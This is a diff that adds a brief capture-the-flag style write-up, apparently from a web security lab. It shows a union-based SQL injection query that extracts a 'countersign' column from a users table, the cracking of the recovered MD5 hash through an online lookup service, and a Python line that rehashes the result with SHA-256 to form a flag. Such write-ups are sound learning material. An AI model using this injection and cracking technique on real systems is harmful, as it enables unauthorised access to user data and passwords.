@@ -1,0 +1,11 @@
+the same process as in images, so will show only the result and the query
+
+```
+1 or 1=1 union select countersign, Commentaire from users
+```
+
+5ff9d0165b4f92b14994e5c685cdce28 to decrypt by https://crackstation.net/. i got FortyTwo that i need to make lowercase and encrypt by sha256 with python code
+
+```
+print(hashlib.sha256(b'fortytwo').hexdigest())
+```
